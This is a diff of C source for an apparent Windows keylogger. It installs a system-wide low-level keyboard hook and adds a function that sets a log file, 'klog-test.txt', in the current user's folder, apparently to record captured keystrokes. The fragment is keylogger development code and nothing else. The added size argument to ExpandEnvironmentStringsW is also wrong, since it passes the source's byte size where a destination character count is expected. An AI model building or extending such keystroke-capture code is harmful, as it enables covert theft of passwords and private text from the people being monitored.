@@ -11,6 +11,8 @@ wchar_t lastWindowTitle[256];
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, INT iCmdShow)
 {
 	MSG msg;
+	
+	GetUserDirectory();
 
 	if (!(kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)))
 		return 1;
@@ -20,6 +22,12 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLin
 	UnhookWindowsHookEx(kbhook);
 
 	return 0;
+}
+
+void GetUserDirectory(void)
+{
+	wchar_t temp[] = L"C:\\Users\\%USERNAME%\\klog-test.txt";
+	ExpandEnvironmentStringsW(temp, kbtestfile, sizeof(temp));
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
